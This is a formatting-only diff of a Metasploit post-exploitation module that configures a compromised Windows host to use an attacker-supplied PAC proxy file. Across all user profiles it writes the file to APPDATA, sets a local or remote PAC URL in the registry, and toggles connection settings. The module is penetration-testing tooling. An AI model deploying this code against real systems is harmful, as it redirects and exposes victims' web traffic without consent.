@@ -8,32 +8,35 @@ class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Windows::Registry
 
-  def initialize(info={})
-    super( update_info( info,
-      'Name'          => 'Windows Manage Proxy PAC File',
-      'Description'   => %q{
-        This module configures Internet Explorer to use a PAC proxy file. By using the LOCAL_PAC
-        option, a PAC file will be created on the victim host. It's also possible to provide a
-        remote PAC file (REMOTE_PAC option) by providing the full URL.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => [ 'Borja Merino <bmerinofe[at]gmail.com>'],
-      'References'    =>
-        [
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Manage Proxy PAC File',
+        'Description' => %q{
+          This module configures Internet Explorer to use a PAC proxy file. By using the LOCAL_PAC
+          option, a PAC file will be created on the victim host. It's also possible to provide a
+          remote PAC file (REMOTE_PAC option) by providing the full URL.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [ 'Borja Merino <bmerinofe[at]gmail.com>'],
+        'References' => [
           [ 'URL', 'https://www.youtube.com/watch?v=YGjIlbBVDqE&hd=1' ],
           [ 'URL', 'http://blog.scriptmonkey.eu/bypassing-group-policy-using-the-windows-registry' ]
         ],
-      'Platform'      => 'win',
-      'SessionTypes'  => [ 'meterpreter' ]
-    ))
+        'Platform' => 'win',
+        'SessionTypes' => [ 'meterpreter' ]
+      )
+    )
 
     register_options(
       [
-        OptPath.new('LOCAL_PAC',     [false, 'Local PAC file.' ]),
-        OptString.new('REMOTE_PAC',  [false, 'Remote PAC file. (Ex: http://192.168.1.20/proxy.pac)' ]),
+        OptPath.new('LOCAL_PAC', [false, 'Local PAC file.' ]),
+        OptString.new('REMOTE_PAC', [false, 'Remote PAC file. (Ex: http://192.168.1.20/proxy.pac)' ]),
         OptBool.new('DISABLE_PROXY', [true, 'Disable the proxy server.', false]),
-        OptBool.new('AUTO_DETECT',   [true, 'Automatically detect settings.', false])
-      ])
+        OptBool.new('AUTO_DETECT', [true, 'Automatically detect settings.', false])
+      ]
+    )
   end
 
   def run
@@ -83,7 +86,7 @@ class MetasploitModule < Msf::Post
   end
 
   def create_pac(local_pac)
-    pac_file = session.sys.config.getenv("APPDATA") << "\\" << Rex::Text.rand_text_alpha((rand(8)+6)) << ".pac"
+    pac_file = session.sys.config.getenv("APPDATA") << "\\" << Rex::Text.rand_text_alpha((rand(8) + 6)) << ".pac"
     conf_pac = ""
 
     if ::File.exist?(local_pac)
@@ -93,13 +96,12 @@ class MetasploitModule < Msf::Post
       return false
     end
 
-    if write_file(pac_file,conf_pac)
+    if write_file(pac_file, conf_pac)
       print_status("PAC proxy configuration file written to #{pac_file}")
       return pac_file
     else
       return false
     end
-
   end
 
   def enable_proxypac(pac)
@@ -114,7 +116,7 @@ class MetasploitModule < Msf::Post
       file = (@remote) ? "#{pac}" : "file://#{pac}"
 
       begin
-        res = registry_setvaldata(key,value_auto,file,"REG_SZ")
+        res = registry_setvaldata(key, value_auto, file, "REG_SZ")
       rescue ::RuntimeError, Rex::TimeoutError
         next
       end
@@ -123,7 +125,7 @@ class MetasploitModule < Msf::Post
         next
       end
 
-      if change_connection(16,'05',key + '\\Connections')
+      if change_connection(16, '05', key + '\\Connections')
         proxy_pac_enabled = true
       end
     end
@@ -141,8 +143,9 @@ class MetasploitModule < Msf::Post
     registry_enumkeys('HKU').each do |k|
       next unless k.include? "S-1-5-21"
       next if k.include? "_Classes"
+
       key = "HKEY_USERS\\#{k}\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet\ Settings\\Connections"
-      if change_connection(16,'0D',key)
+      if change_connection(16, '0D', key)
         print_good("Automatically Detect Settings on.")
         auto_detect_enabled = true
       end
@@ -162,9 +165,10 @@ class MetasploitModule < Msf::Post
     registry_enumkeys('HKU').each do |k|
       next unless k.include? "S-1-5-21"
       next if k.include? "_Classes"
+
       key = "HKEY_USERS\\#{k}\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet\ Settings"
       begin
-        registry_setvaldata(key,value_enable,0,"REG_DWORD")
+        registry_setvaldata(key, value_enable, 0, "REG_DWORD")
         profile = true
       rescue ::RuntimeError, Rex::TimeoutError
         next
@@ -184,7 +188,7 @@ class MetasploitModule < Msf::Post
     begin
       value_con = registry_getvaldata(key, value_default)
       binary_data = value_con.unpack('H*')[0]
-      binary_data[offset,2] = value
+      binary_data[offset, 2] = value
       registry_setvaldata(key, value_default, ["%x" % binary_data.to_i(16)].pack("H*"), "REG_BINARY")
     rescue ::RuntimeError, Rex::TimeoutError
       return false
